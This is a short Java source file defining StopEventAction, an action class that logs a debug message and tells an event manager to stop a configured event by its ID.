package com.android.service.action;

import org.json.JSONObject;

import com.android.service.auto.Cfg;
import com.android.service.conf.ConfAction;
import com.android.service.manager.ManagerEvent;
import com.android.service.util.Check;

public class StopEventAction extends EventAction {
	private static final String TAG = "StopEventAction";

	public StopEventAction(ConfAction params) {
		super( params);
	}

	@Override
	public boolean execute() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + eventId);//$NON-NLS-1$
		}
		final ManagerEvent eventManager = ManagerEvent.self();

		eventManager.stop(eventId);
		return true;
	}

}
